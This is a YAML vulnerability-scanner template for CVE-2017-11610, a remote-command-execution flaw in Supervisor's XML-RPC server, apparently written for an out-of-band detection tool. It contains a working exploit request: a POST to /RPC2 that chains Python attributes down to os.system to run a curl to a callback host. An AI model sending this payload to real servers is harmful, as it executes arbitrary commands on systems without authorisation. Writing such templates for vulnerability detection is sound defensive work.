id: CVE-2017-11610

info:
  name: Supervisor RCE
  author: zan8in
  severity: critical
  verified: true
  description: |-
    Supervisor是一套进程控制系统，用于监视和控制类Unix系统上的进程。XML-RPC server是其中的一个XML-RPC服务器。 Supervisor中的XML-RPC服务器存在安全漏洞。远程攻击者可借助特制的XML-RPC请求利用该漏洞执行任意命令。
  tags: cve,cve2017,supervisor,rce
  created: 2024/02/25

set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /RPC2
      headers:
        Content-type: text/xml
      body: |
        <methodCall>
          <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
          <params>
            <param>
              <string>curl {{oobHTTP}}</string>
            </param>
          </params>
        </methodCall>
    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
